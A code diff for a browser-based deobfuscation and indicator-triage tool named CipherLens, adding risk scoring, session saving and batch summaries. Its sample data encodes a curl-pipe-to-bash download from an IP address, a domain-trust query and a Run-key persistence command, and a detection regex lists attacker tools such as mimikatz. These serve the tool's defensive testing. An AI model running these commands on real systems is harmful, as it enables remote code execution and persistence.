@@ -27,17 +27,17 @@ select{background:var(--pn2);border:1px solid var(--bd);border-radius:8px;paddin
 main{max-width:1400px;margin:0 auto;padding:0 20px 48px;display:grid;gap:14px}
 .grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
 @media(max-width:900px){.grid{grid-template-columns:1fr}}
-.panel{background:var(--pn);border:1px solid var(--bd);border-radius:12px;padding:14px;min-width:0}
+.panel{background:linear-gradient(180deg,var(--pn),var(--pn2));border:1px solid var(--bd);border-radius:14px;padding:14px;min-width:0;box-shadow:0 10px 22px rgba(0,0,0,.12)}
 .ph{display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-wrap:wrap}
-h2{font-size:13px;margin:0;font-weight:600;letter-spacing:.2px}h3{font-size:12.5px;margin:12px 0 4px}
+h2{font-size:13px;margin:0;font-weight:700;letter-spacing:.2px}h3{font-size:12.5px;margin:12px 0 4px}
 small,.mut{color:var(--mut);font-size:12px}
 button,input{font:inherit;color:var(--tx)}
-button{background:transparent;border:1px solid var(--bd);border-radius:8px;padding:5px 12px;cursor:pointer;transition:border-color .15s,background .15s}
-button:hover{border-color:var(--ac);background:var(--pn2)}
+button{background:transparent;border:1px solid var(--bd);border-radius:8px;padding:5px 12px;cursor:pointer;transition:border-color .15s,background .15s,transform .15s,box-shadow .15s}
+button:hover{border-color:var(--ac);background:var(--pn2);transform:translateY(-1px)}
 button:focus-visible,textarea:focus-visible,input:focus-visible{outline:2px solid var(--ac);outline-offset:1px}
-button.pri{background:var(--ac);color:#fff;border-color:var(--ac);font-weight:600;padding:7px 26px}
-button.pri:hover{background:var(--ac2)}
-textarea,pre{width:100%;height:300px;margin:0;background:var(--pn2);border:1px solid var(--bd);border-radius:8px;color:var(--tx);font:13px/1.55 var(--mono);padding:12px;resize:vertical;overflow:auto;white-space:pre-wrap;word-break:break-all}
+button.pri{background:linear-gradient(180deg,var(--ac),#725ef9);color:#fff;border-color:var(--ac);font-weight:700;padding:7px 26px;box-shadow:0 10px 18px color-mix(in srgb,var(--ac) 28%,transparent)}
+button.pri:hover{background:linear-gradient(180deg,var(--ac2),var(--ac));}
+textarea,pre{width:100%;height:300px;margin:0;background:var(--pn2);border:1px solid var(--bd);border-radius:10px;color:var(--tx);font:13px/1.55 var(--mono);padding:12px;resize:vertical;overflow:auto;white-space:pre-wrap;word-break:break-all;box-shadow:inset 0 1px 0 rgba(255,255,255,.02)}
 textarea:focus{border-color:var(--ac)}
 .bar{display:flex;gap:12px;align-items:center;margin:12px 0 10px;flex-wrap:wrap}
 .key{color:var(--mut);font-size:12px;display:flex;gap:6px;align-items:center}
@@ -51,6 +51,10 @@ textarea:focus{border-color:var(--ac)}
 .chain button{border-radius:20px;padding:2px 11px;font-size:12.5px}
 .chain button.on{border-color:var(--ac);color:var(--ac2)}
 .chain span{color:var(--mut)}
+.triage{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:10px 0 12px;padding:10px 12px;border:1px solid var(--bd);border-radius:10px;background:linear-gradient(180deg,color-mix(in srgb,var(--pn2) 92%,transparent),transparent);}
+.triage .score{display:inline-flex;align-items:center;gap:6px;padding:4px 10px;border-radius:999px;border:1px solid var(--bd);font:700 12px var(--mono);}
+.triage .reason{font-size:12px;color:var(--mut)}
+.triage .reason strong{color:var(--tx)}
 mark,.u,.i,.h,.m,.s{border-radius:3px;padding:0 2px;color:inherit;background:none}
 .u{background:color-mix(in srgb,var(--ac) 28%,transparent)}
 .i{background:color-mix(in srgb,var(--warn) 30%,transparent)}
@@ -103,19 +107,21 @@ textarea,pre{height:clamp(200px,38vh,340px)}
 
 /* ---- Equal I/O boxes ---- */
 .io{padding:20px}
-.iogrid{display:grid;grid-template-columns:minmax(0,1fr) auto minmax(0,1fr);gap:18px;align-items:center}
+.iogrid{display:grid;grid-template-columns:minmax(0,1fr) auto minmax(0,1fr);gap:18px;align-items:stretch}
 .lbl{font:700 13px var(--mono);letter-spacing:.6px;margin-bottom:8px}
-.iogrid textarea,.iogrid pre{height:clamp(230px,40vh,380px);border:2px solid var(--tx);border-radius:0;resize:none;background:var(--pn2);padding:14px}
+.iogrid .col{display:flex;flex-direction:column;min-width:0}
+.iogrid textarea,.iogrid pre{height:100%;min-height:clamp(230px,40vh,380px);border:1px solid var(--bd);border-radius:12px;resize:none;background:var(--pn2);padding:14px;box-shadow:inset 0 1px 0 rgba(255,255,255,.02)}
 .iogrid textarea:focus{border-color:var(--ac2)}
 .iogrid textarea::placeholder,#out .mut{color:var(--mut);font-style:normal}
 .foot{display:flex;justify-content:space-between;align-items:center;gap:8px;margin-top:8px;font:12px var(--mono);color:var(--mut);flex-wrap:wrap}
-.foot span:last-child{display:flex;gap:4px;flex-wrap:wrap}
+.foot span:last-child{display:flex;gap:4px;flex-wrap:wrap;justify-content:flex-end}
 .lnk{border:0;background:none;padding:2px 4px;font:12px var(--mono);color:var(--tx);min-height:0;border-radius:0}
 .lnk:hover{background:none;text-decoration:underline}
-.swap{width:46px;height:46px;border:2px solid var(--tx);border-radius:0;font-size:20px;padding:0;line-height:1}
-.actions{justify-content:center;margin:20px 0 12px}
-.urltools{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:16px;padding-bottom:14px;border-bottom:1px solid var(--bd)}
-.urltools .lbl{margin:0 8px 0 0;color:var(--mut)}
+.swap{width:52px;height:52px;border:1px solid var(--bd);border-radius:12px;font-size:20px;padding:0;line-height:1;background:linear-gradient(180deg,var(--pn2),var(--pn));box-shadow:0 8px 18px rgba(0,0,0,.12);align-self:center;justify-self:center}
+.actions{justify-content:center;margin:20px 0 12px;padding-top:4px}
+.urltools{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:16px;padding:10px 12px 14px;border:1px solid var(--bd);border-radius:10px;background:color-mix(in srgb,var(--pn2) 88%,transparent);}
+.urltools .lbl{margin:0 8px 0 0;color:var(--mut);font-weight:700;letter-spacing:.12em}
+.urltools button{flex:0 0 auto}
 .io .chips{justify-content:center}
 .io .chain{margin-bottom:12px}
 @media(max-width:900px){
@@ -124,6 +130,7 @@ textarea,pre{height:clamp(200px,38vh,340px)}
 }
 @media(max-width:600px){
   .io{padding:12px}
+  .urltools{padding:8px 10px}
   .urltools .lbl{flex-basis:100%}
   .urltools button{flex:1 1 calc(50% - 8px)}
   .iogrid textarea,.iogrid pre{height:clamp(180px,30vh,260px);padding:10px}
@@ -158,7 +165,7 @@ button.clr{padding:7px 22px;font-weight:600}
 </style>
 </head>
 <body>
-<nav><button id="bSample">Load sample</button><button id="bTheme" aria-label="Toggle theme">Light mode</button></nav>
+<nav><button id="bSample">Load sample</button><button id="bSaveSession">Save session</button><button id="bLoadSession">Restore session</button><button id="bTheme" aria-label="Toggle theme">Light mode</button></nav>
 <div class="hero">
   <div class="logo">&lt;Cipher<i>Lens</i>/&gt;</div>
   <h1>Decode. Deobfuscate. Investigate.</h1>
@@ -195,6 +202,7 @@ button.clr{padding:7px 22px;font-weight:600}
       <label class="key">XOR key <input id="key" placeholder="text or 0x41" autocomplete="off"></label>
     </div>
     <div id="chain" class="chips chain"></div>
+    <div id="triage" class="triage" aria-live="polite"></div>
     <div id="ops" class="chips" role="group" aria-label="Decoders"></div>
   </section>
   <section class="panel" id="urlPanel" hidden><div class="ph"><h2>URL breakdown</h2><small>Parsed locally; no URL is opened or contacted</small></div><div id="urlParts" class="grp"></div></section>
@@ -241,15 +249,18 @@ const rot13=s=>s.replace(/[a-z]/gi,c=>{const b=c<='Z'?65:97;return String.fromCh
 const b2t=b=>{let n=0;for(const x of b)if(!x)n++;
   if(b.length>3&&n>b.length/4)return new TextDecoder('utf-16le').decode(b).replace(/^\uFEFF/,'');
   try{return new TextDecoder('utf-8',{fatal:true}).decode(b)}catch{let r='';for(const x of b)r+=String.fromCharCode(x);return r}};
+const looksHumanReadable=s=>{if(!s||s.length<3)return false;const ratio=printable(s);if(ratio<.85)return false;const t=s.replace(/\s+/g,'');return /[A-Za-z]{3,}/.test(t)||/[0-9]{2,}/.test(t)||/[\s:./\\_\-]{2,}/.test(s)};
 const fromB64=s=>{s=s.replace(/\s+/g,'').replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';return Uint8Array.from(atob(s),c=>c.charCodeAt(0))};
 const magic=b=>b[0]==0x1f&&b[1]==0x8b?'gzip':(b[0]==0x78&&[1,0x9c,0xda].includes(b[1])?'deflate':null);
-async function inflate(b,f){const r=await new Response(new Blob([b]).stream().pipeThrough(new DecompressionStream(f))).arrayBuffer();return b2t(new Uint8Array(r))}
+const hasDecompressionSupport=()=>typeof window !== 'undefined' && typeof DecompressionStream === 'function';
+const hasCompressionSupport=()=>typeof window !== 'undefined' && typeof CompressionStream === 'function';
+async function inflate(b,f){if(!hasDecompressionSupport())throw new Error('This browser does not support DecompressionStream');const r=await new Response(new Blob([b]).stream().pipeThrough(new DecompressionStream(f))).arrayBuffer();return b2t(new Uint8Array(r))}
 function b64find(s){
   const t=s.replace(/\s+/g,'');
-  const c=!/[ \t]/.test(s.trim())&&/^[A-Za-z0-9+\/_-]{8,}={0,2}$/.test(t)?[t]:(s.match(/[A-Za-z0-9+\/]{12,}={0,2}/g)||[]).sort((a,b)=>b.length-a.length).slice(0,5);
+  const c=!/[ \t]/.test(s.trim())&&/^[A-Za-z0-9+\/_-]+={0,2}$/.test(t)?[t]:(s.match(/[A-Za-z0-9+\/_-]{4,}={0,2}/g)||[]).sort((a,b)=>b.length-a.length).slice(0,5);
   for(const x of c){try{const b=fromB64(x),m=magic(b);
     if(m)return{b,m,whole:x===t,tok:x};
-    const tx=b2t(b);if(tx.length>=3&&printable(tx)>.9)return{b,tx,whole:x===t,tok:x}}catch{}}
+    const tx=b2t(b);if(tx.length>=3&&looksHumanReadable(tx))return{b,tx,whole:x===t,tok:x}}catch{} }
   return null}
 const hx=s=>{const c=s.replace(/0x|\\x|[\s:,-]/gi,'');if(c.length<4||c.length%2||!/^[0-9a-f]+$/i.test(c))return null;return Uint8Array.from(c.match(/../g),x=>parseInt(x,16))};
 const xorS=(s,k)=>{let o='';for(let i=0;i<s.length;i++)o+=String.fromCharCode((s.charCodeAt(i)&255)^k[i%k.length]);return o};
@@ -277,7 +288,7 @@ const D=[
   return `// HEADER\n${JSON.stringify(h,null,2)}\n\n// PAYLOAD\n${JSON.stringify(b,null,2)}\n${n}\n// SIGNATURE (not verified)\n${p[2]}`}},
  {id:'cc',name:'Char codes',det:s=>cc(s)?.8:0,run:s=>{const a=cc(s);return a&&a.map(n=>String.fromCharCode(+n)).join('')}},
  {id:'bin',name:'Binary',det:s=>/^[01\s]{16,}$/.test(s)&&s.replace(/\s/g,'').length%8==0?.9:0,run:s=>b2t(Uint8Array.from(s.replace(/\s/g,'').match(/.{8}/g),x=>parseInt(x,2)))},
- {id:'b32',name:'Base32',det:s=>{if(!/^[A-Z2-7\s]{16,}={0,6}\s*$/.test(s))return 0;const b=b32(s);return b&&printable(b2t(b))>.9?.85:0},run:s=>{const b=b32(s);return b&&b2t(b)}},
+ {id:'b32',name:'Base32',det:s=>{const v=s.replace(/\s+/g,'');if(!/^[A-Z2-7]+={0,6}$/.test(v)||v.length<8)return 0;const b=b32(s);return b&&looksHumanReadable(b2t(b))?.85:0},run:s=>{const b=b32(s);return b&&b2t(b)}},
  {id:'psd',name:'PowerShell de-obfuscate',det:s=>/`[A-Za-z]|['"]\s*\+\s*['"]|\[char\]\s*\(?\s*\d/i.test(s)&&psclean(s)!==s?.8:0,run:s=>{const o=psclean(s);return o!==s?o:null}},
  {id:'rot',name:'ROT13',det:s=>kwc(rot13(s))>kwc(s)?.6:0,run:rot13},
  {id:'rev',name:'Reverse',det:s=>kwc([...s].reverse().join(''))>kwc(s)?.6:0,run:s=>[...s].reverse().join('')},
@@ -297,7 +308,7 @@ const keyBytes=()=>{const v=$('#key').value;if(!v)throw new Error('Enter an XOR 
   return Array.from(v,c=>c.charCodeAt(0)&255)};
 const w16=s=>{const b=new Uint8Array(s.length*2);for(let i=0;i<s.length;i++){b[2*i]=s.charCodeAt(i)&255;b[2*i+1]=s.charCodeAt(i)>>8}return b};
 const e32=b=>{let bits='';for(const x of b)bits+=x.toString(2).padStart(8,'0');let o='';for(let i=0;i<bits.length;i+=5)o+=B32A[parseInt(bits.slice(i,i+5).padEnd(5,'0'),2)];while(o.length%8)o+='=';return o};
-const gz=async b=>new Uint8Array(await new Response(new Blob([b]).stream().pipeThrough(new CompressionStream('gzip'))).arrayBuffer());
+const gz=async b=>{if(!hasCompressionSupport())throw new Error('This browser does not support CompressionStream');return new Uint8Array(await new Response(new Blob([b]).stream().pipeThrough(new CompressionStream('gzip'))).arrayBuffer())};
 const E=[
  {id:'b64',name:'Base64',run:s=>b64e(u8(s))},
  {id:'b64u',name:'Base64 URL-safe',run:s=>b64e(u8(s)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'')},
@@ -346,6 +357,47 @@ function analyze(t){
     for(const [s,e,c] of R){if(s<p)continue;html+=esc(t.slice(p,s))+`<span class="${c}">${esc(t.slice(s,e))}</span>`;p=e}
     html+=esc(t.slice(p))}else html=esc(t);
   return{html,F}}
+function explainDecode(name){
+  const n=name.toLowerCase();
+  if(n.includes('powershell'))return 'PowerShell or encoded script payload';
+  if(n.includes('base64'))return 'Base64 blob usually holds scripts, text, or compressed content';
+  if(n.includes('gzip'))return 'Compressed payload; decompression often reveals the real content';
+  if(n.includes('hex'))return 'Hex dump or raw byte representation';
+  if(n.includes('url'))return 'URL-encoded or percent-encoded data';
+  if(n.includes('xor'))return 'Bytewise XOR obfuscation or key-rotating payload';
+  if(n.includes('rot13'))return 'Rotational text substitution';
+  if(n.includes('reverse'))return 'Simple reversal or string scrambling';
+  if(n.includes('jwt'))return 'JWT metadata or embedded claims';
+  return 'Decoding layer applied to the sample';
+}
+function decodeConfidence(name,text){
+  const n=name.toLowerCase();
+  let score=55;
+  if(n.includes('base64')||n.includes('hex')||n.includes('url'))score+=20;
+  if(n.includes('powershell')||n.includes('gzip'))score+=15;
+  if(n.includes('xor')||n.includes('jwt'))score+=10;
+  if(text && /\b(?:whoami|curl|IEX|Invoke-Expression|powershell|reg add|net user|nltest|mimikatz)\b/i.test(text))score+=15;
+  return Math.min(98,score);
+}
+function summarizeRisk(F){
+  const keys=Object.keys(F);
+  if(!keys.length)return {level:'Low',score:0,confidence:'Low',reasons:['No strong indicators detected.']};
+  let score=0;const reasons=[];
+  for(const k of keys){
+    const v=F[k].v.size;
+    if(k[0]==='S'){score+=22; reasons.push(k.replace(/^Suspicious:\s*/,'')); continue}
+    if(/URLs|Domains|IPv4/.test(k))score+=Math.min(18, v*6);
+    if(/Hashes/.test(k))score+=12;
+    if(/Email/.test(k))score+=8;
+    if(/Windows paths|Registry/.test(k))score+=10;
+    if(/Windows paths/.test(k) && v>0)reasons.push('Windows file or registry artifacts');
+  }
+  if(reasons.some(r=>/Credential|Download|Network|Persistence/i.test(r)))score+=12;
+  if(score>=75){return {level:'Critical',score:Math.min(100,score),confidence:'High',reasons:reasons.slice(0,3).length?reasons.slice(0,3):['High-confidence malicious activity']};}
+  if(score>=45){return {level:'High',score:Math.min(100,score),confidence:'Medium',reasons:reasons.slice(0,3).length?reasons.slice(0,3):['Malicious indicators likely present']};}
+  if(score>=18){return {level:'Medium',score:Math.min(100,score),confidence:'Medium',reasons:reasons.slice(0,3).length?reasons.slice(0,3):['Observable but not conclusive indicators']};}
+  return {level:'Low',score:Math.min(100,score),confidence:'Low',reasons:reasons.slice(0,2).length?reasons.slice(0,2):['No strong indicators detected.']};
+}
 const dfk=k=>/^(URLs|IPv4|Domains)/.test(k);
 function defangToken(token){
   let value=token.replace(/^https:/i,'hxxps:').replace(/^http:/i,'hxxp:');
@@ -403,29 +455,73 @@ async function auto(){
   render();if(any)record();else toast('No encoding detected. Try a manual decoder below the input.')}
 function record(){
   const top=cur();if(hist[0]&&hist[0].stack.at(-1)===top)return;
-  hist.unshift({time:new Date().toLocaleTimeString(),names:[...names],stack:[...stack]});hist.length=Math.min(hist.length,30);renderHist()}
+  hist.unshift({time:new Date().toLocaleTimeString(),names:[...names],stack:[...stack]});hist.length=Math.min(hist.length,30);renderHist();saveSessionState();}
 function renderHist(){
   $('#hist').innerHTML=hist.length?hist.map((h,i)=>`<button data-h="${i}">${h.time} | ${esc(h.names.join(' > '))} | ${esc(h.stack.at(-1).slice(0,70).replace(/\s+/g,' '))}</button>`).join(''):'<span class="mut">Decoded results appear here so you can jump back to them.</span>'}
+const SESSION_KEY='cipher-lens-session-v1';
+function serializeIndicators(F){
+  const out={};
+  for(const [k,v] of Object.entries(F||{}))out[k]={c:v?.c||'m',v:[...v?.v||[]]};
+  return out;
+}
+function restoreIndicators(F){
+  const out={};
+  for(const [k,v] of Object.entries(F||{}))out[k]={c:v?.c||'m',v:new Set(Array.isArray(v?.v)?v.v:[])};
+  return out;
+}
+function snapshotSession(){
+  return {version:1,savedAt:new Date().toISOString(),input:$('#inp').value,stack:[...stack],names:[...names],rows:rows.map(r=>({n:r.n,input:r.input,st:[...r.st],nm:[...r.nm],F:serializeIndicators(r.F),risk:r.risk})),hist:hist.slice(0,30),mode};
+}
+function saveSessionState(){
+  try{localStorage.setItem(SESSION_KEY,JSON.stringify(snapshotSession()));}catch{}}
+function restoreSessionState(){
+  try{
+    const raw=localStorage.getItem(SESSION_KEY); if(!raw) return false;
+    const state=JSON.parse(raw); if(!state || !Array.isArray(state.stack)) return false;
+    stack=Array.isArray(state.stack)?state.stack.slice():['']; names=Array.isArray(state.names)?state.names.slice():['Input'];
+    rows=Array.isArray(state.rows)?state.rows.map(r=>({n:r.n,input:r.input,st:Array.isArray(r.st)?r.st.slice():[''],nm:Array.isArray(r.nm)?r.nm.slice():['Input'],F:restoreIndicators(r.F||{}),risk:r.risk||'LOW'})):[];
+    hist=Array.isArray(state.hist)?state.hist.slice(0,30):[];
+    if(Array.isArray(state.stack)&&state.stack.length){$('#inp').value=typeof state.input==='string'?state.input:state.stack[0]||'';}
+    if(state.mode && ['dec','enc','bat'].includes(state.mode))mode=state.mode;
+    setMode(mode); render(); renderHist(); if(mode==='bat'&&rows.length)renderBatch();
+    toast('Session restored'); return true;
+  }catch{return false}
+}
 function render(){
   const t=cur(),a=analyze(t),det=detect(t),dm=new Map(det.map(x=>[x.d.id,x.sc]));
+  const triage=summarizeRisk(a.F);
+  const conf=Math.max(...names.map((n,i)=>i===0?0:decodeConfidence(n,t)),0);
   $('#out').innerHTML=a.html||'<span class="mut">// output appears here</span>';
   $('#ocnt').textContent=`${t.length} chars | layer ${stack.length-1}`;
   $('#cnt').textContent=stack[0].length+' chars';
   $('#chain').innerHTML=names.map((n,i)=>`<button class="${i==stack.length-1?'on':''}" data-i="${i}">${esc(n)}</button>`).join('<span>&rsaquo;</span>');
   $('#ops').innerHTML=D.map(d=>{const s=dm.get(d.id)||0;return`<button class="op ${s>=.7?'hit':s>0?'maybe':''}" data-id="${d.id}">${esc(d.name)}${s?`<i>${Math.round(s*100)}%</i>`:''}</button>`}).join('');
+  const triageColor={Critical:'var(--bad)',High:'var(--bad)',Medium:'var(--warn)',Low:'var(--ok)'}[triage.level]||'var(--mut)';
+  const chainText = names.slice(1).map((n,i)=>`${i+1}. ${n} — ${explainDecode(n)}`).slice(0,3).join(' · ');
+  $('#triage').innerHTML=`<span class="score" style="border-color:${triageColor};color:${triageColor};">${triage.level} · ${triage.score}</span><span class="reason"><strong>Confidence:</strong> ${triage.confidence} · <strong>Decode path:</strong> ${esc(chainText || 'No extra decode layers yet')}</span>`;
   const ks=Object.keys(a.F),sus=ks.filter(k=>k[0]=='S'),lv=sus.some(k=>/Credential/.test(k))||sus.length>=3?'HIGH':sus.length?'MEDIUM':'';
   const rk=$('#risk');rk.textContent=lv?'Triage hint: '+lv+' (heuristic, verify in EDR)':'';rk.style.color=lv=='HIGH'?'var(--bad)':'var(--warn)';
   $('#iocs').innerHTML=ks.length?ks.sort((x,y)=>(y[0]=='S')-(x[0]=='S')).map(k=>`<div><h3 class="${a.F[k].c}">${esc(k)} <small>${a.F[k].v.size}</small></h3><div>${[...a.F[k].v].map(v=>`<code data-c="${esc(v)}">${esc(v.slice(0,160))}</code>`).join('')}</div></div>`).join(''):'<span class="mut">Nothing suspicious found in this layer yet. Decode further or paste more content.</span>';
   renderUrlParts(a.F,t)}
+function parseLocalUrl(raw){
+  const clean=refang(raw).trim();
+  if(!clean)return null;
+  const candidates=[];
+  if(/^[a-z][a-z0-9+.-]*:\/\//i.test(clean))candidates.push(clean);
+  else if(/^(?:www\.)?[a-z0-9.-]+\.[a-z]{2,}(?::\d+)?(?:[/?#]|$)/i.test(clean))candidates.push('https://'+clean);
+  else if(/^\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?(?:[/?#]|$)/.test(clean))candidates.push('https://'+clean);
+  for(const value of candidates){
+    try{const u=new URL(value); const host=u.hostname||''; if(!host||(!/[.]/.test(host)&&!/^localhost$/i.test(host)))continue; return{raw:raw,scheme:u.protocol.replace(':',''),host:u.hostname,port:u.port||'(default)',path:u.pathname||'/',query:u.search||'(none)',fragment:u.hash||'(none)'}}catch{}
+  }
+  return null;
+}
 function renderUrlParts(F,t){
   const vals=[...(F.URLs?.v||[]),...(F.Domains?.v||[])];
-  const rows=vals.map(raw=>{try{const clean=refang(raw),u=new URL(/^[a-z][a-z0-9+.-]*:\/\//i.test(clean)?clean:'https://'+clean);
-    return{raw,scheme:u.protocol.replace(':',''),host:u.hostname,port:u.port||'(default)',path:u.pathname||'/',query:u.search||'(none)',fragment:u.hash||'(none)'}
-  }catch{return{raw,error:'Could not parse this value'}}});
+  const rows=vals.map(raw=>parseLocalUrl(raw)).filter(Boolean);
   $('#urlPanel').hidden=!rows.length;
-  $('#urlParts').innerHTML=rows.map(r=>r.error?`<div><code>${esc(r.raw)}</code> <small>${r.error}</small></div>`:`<div><h3><code>${esc(defang(r.raw))}</code></h3><div>Scheme: ${esc(r.scheme)} · Host: ${esc(r.host)} · Port: ${esc(r.port)}<br>Path: ${esc(r.path)} · Query: ${esc(r.query)} · Fragment: ${esc(r.fragment)}</div></div>`).join('');
+  $('#urlParts').innerHTML=rows.map(r=>`<div><h3><code>${esc(defang(r.raw))}</code></h3><div>Scheme: ${esc(r.scheme)} · Host: ${esc(r.host)} · Port: ${esc(r.port)}<br>Path: ${esc(r.path)} · Query: ${esc(r.query)} · Fragment: ${esc(r.fragment)}</div></div>`).join('');
 }
-function reset(v){stack=[v];names=['Input'];render()}
+function reset(v){stack=[v];names=['Input'];render();saveSessionState();}
 function setInput(v){$('#inp').value=v;reset(v)}
 function sample(){
   const u16=s=>{const b=new Uint8Array(s.length*2);for(let i=0;i<s.length;i++){b[2*i]=s.charCodeAt(i)&255;b[2*i+1]=s.charCodeAt(i)>>8}return b};
@@ -444,7 +540,9 @@ function setMode(m){
   const prev=mode;mode=m;const e=m=='enc',b=m=='bat';if(prev!=m&&(prev=='bat'||b)){rows=[];renderBatch();setInput('')}
   for(const[k,id]of[['dec','#mDec'],['enc','#mEnc'],['bat','#mBat']]){$(id).classList.toggle('on',m==k);$(id).setAttribute('aria-pressed',String(m==k))}
   $('#bAuto').textContent=e?'Encode':b?'Upload .txt file':'Decode';$('#inp').readOnly=b;$('#file').accept=b?'.txt,text/plain':'';$('#bFile').textContent=b?'[upload .txt]':'[open file]';$('#encWrap').hidden=!e;$('#ops').hidden=e||b;$('#batch').hidden=!b;
-  $('#inp').placeholder=e?'// type plain text, pick an encoding, press Encode. Encode again to add a layer':b?'// batch mode: upload a .txt file with one encoded value per line (max 500 values). Use Decode mode for a single value':'// paste encoded or obfuscated content. Ctrl+Enter to decode'}
+  $('#inp').placeholder=e?'// type plain text, pick an encoding, press Encode. Encode again to add a layer':b?'// batch mode: upload a .txt file with one encoded value per line (max 500 values). Use Decode mode for a single value':'// paste encoded or obfuscated content. Ctrl+Enter to decode';
+  saveSessionState();
+}
 $('#encSel').innerHTML=E.map(e=>`<option value="${e.id}">${esc(e.name)}</option>`).join('');
 $('#mDec').onclick=()=>setMode('dec');$('#mEnc').onclick=()=>setMode('enc');$('#mBat').onclick=()=>setMode('bat');
 $('#inp').addEventListener('input',e=>{clearTimeout(timer);timer=setTimeout(()=>reset(e.target.value),150)});
@@ -491,7 +589,14 @@ async function autoOn(s){const st=[s],nm=['Input'];
     if(r==null||r==='')break;const t=typeof r=='string'?r:r.t,nn=typeof r=='string'?c.d.name:r.n;
     if(t===st.at(-1)||st.includes(t))break;st.push(t);nm.push(nn)}
   return{st,nm}}
-const riskOf=F=>{const q=Object.keys(F).filter(k=>k[0]=='S');return q.some(k=>/Credential/.test(k))||q.length>=3?'HIGH':q.length?'MEDIUM':'-'};
+const riskOf=F=>summarizeRisk(F).level.toUpperCase();
+function summarizeBatch(rows){
+  if(!rows.length)return {top:'none',worst:'Low'};
+  const counts={};for(const r of rows){for(const k in r.F){for(const v of r.F[k].v){const key=(k[0]=='S'?'Suspicious':k)+': '+(dfk(k)?defang(v):v);counts[key]=(counts[key]||0)+1;}}}
+  const top=Object.entries(counts).sort((a,b)=>b[1]-a[1])[0];
+  const worst=rows.slice().sort((a,b)=>summarizeRisk(b.F).score-summarizeRisk(a.F).score)[0];
+  return {top:top?`${top[0]} (${top[1]} rows)`: 'none', worst: worst ? riskOf(worst.F) : 'Low'};
+}
 async function batch(){
   const lines=$('#inp').value.split(/\r?\n/).map(x=>x.trim()).filter(Boolean).slice(0,500);
   if(!lines.length){toast('Upload a .txt file first');return}
@@ -501,13 +606,15 @@ async function batch(){
     if(i%10==9){$('#bstat').textContent=`Analyzing ${i+1}/${lines.length}...`;await new Promise(r=>setTimeout(r))}}
   renderBatch()}
 function renderBatch(){
-  if(!rows.length){$('#btable').innerHTML='';$('#bagg').innerHTML='';$('#bstat').textContent='Upload a .txt file with one value per line. Click a row to open it above.';return}
-  const C={HIGH:'var(--bad)',MEDIUM:'var(--warn)','-':'var(--mut)'};
-  $('#bstat').textContent=`${rows.length} values analyzed. Click a row to open it above.`;
+  if(!rows.length){$('#btable').innerHTML='';$('#bagg').innerHTML='';$('#bstat').textContent='Upload a .txt file with one value per line. Click a row to open it above.';saveSessionState();return}
+  const C={HIGH:'var(--bad)',MEDIUM:'var(--warn)','-':'var(--mut)',LOW:'var(--ok)'};
+  const batchSummary=summarizeBatch(rows);
+  $('#bstat').innerHTML=`${rows.length} values analyzed. Click a row to open it above. <span class="mut">Top IOC: ${esc(batchSummary.top)} · Highest risk: ${batchSummary.worst}</span>`;
   $('#btable').innerHTML='<tr><th>#</th><th>Input</th><th>Layers</th><th>Decoded output</th><th>Risk</th><th>IOCs</th></tr>'+rows.map((r,i)=>`<tr data-r="${i}"><td>${r.n}</td><td>${esc(r.input.slice(0,40))}</td><td>${r.nm.length>1?esc(r.nm.slice(1).join(' > ')):'<span class="mut">none detected</span>'}</td><td>${esc(r.st.at(-1).slice(0,70).replace(/\s+/g,' '))}</td><td style="color:${C[r.risk]}"><b>${r.risk}</b></td><td>${Object.values(r.F).reduce((a,x)=>a+x.v.size,0)}</td></tr>`).join('');
   const A={};for(const r of rows)for(const k in r.F)for(const v of r.F[k].v){const a=A[k]=A[k]||{c:r.F[k].c,m:new Map()};if(!a.m.has(v))a.m.set(v,[]);a.m.get(v).push(r.n)}
   const ks=Object.keys(A).sort((x,y)=>(y[0]=='S')-(x[0]=='S'));
-  $('#bagg').innerHTML=ks.length?ks.map(k=>`<div><h3 class="${A[k].c}">${esc(k)} <small>${A[k].m.size}</small></h3><div>${[...A[k].m].map(([v,n])=>`<code data-c="${esc(v)}" title="rows: ${n.join(', ')}">${esc(v.slice(0,120))}${n.length>1?' x'+n.length:''}</code>`).join('')}</div></div>`).join(''):'<span class="mut">No indicators found in any value.</span>'}
+  $('#bagg').innerHTML=ks.length?ks.map(k=>`<div><h3 class="${A[k].c}">${esc(k)} <small>${A[k].m.size}</small></h3><div>${[...A[k].m].map(([v,n])=>`<code data-c="${esc(v)}" title="rows: ${n.join(', ')}">${esc(v.slice(0,120))}${n.length>1?' x'+n.length:''}</code>`).join('')}</div></div>`).join(''):'<span class="mut">No indicators found in any value.</span>';
+  saveSessionState();}
 const csvCell=v=>{v=String(v);if(/^[=+\-@\t\r]/.test(v))v="'"+v;return '"'+v.replace(/"/g,'""')+'"'};
 function dl(text,type,ext){const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([text],{type}));a.download='cipher-lens-'+Date.now()+'.'+ext;a.click();setTimeout(()=>URL.revokeObjectURL(a.href),1e3)}
 const iocLine=r=>Object.entries(r.F).map(([k,x])=>k+': '+[...x.v].join(' | ')).join(' ; ');
@@ -520,14 +627,18 @@ $('#btable').addEventListener('click',e=>{const t=e.target.closest('tr[data-r]')
   stack=[...r.st];names=[...r.nm];render();$('#btable').querySelectorAll('tr.sel').forEach(x=>x.classList.remove('sel'));t.classList.add('sel');$('#out').scrollIntoView({block:'nearest'})});
 $('#bagg').addEventListener('click',e=>{const c=e.target.closest('[data-c]');if(c)copy(c.dataset.c)});
 const batchSample=()=>[sample(),btoa('nltest /dom_trusts'),Array.from(u8('curl http://203.0.113.9/p.sh | bash'),x=>'%'+x.toString(16).padStart(2,'0')).join(''),h2(u8('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\Users\\Public\\u.exe')),btoa('hello world'),'just a normal sentence'].join('\n');
-function md(){const F=analyze(cur()).F,ks=Object.keys(F),f='```',risk=riskOf(F);
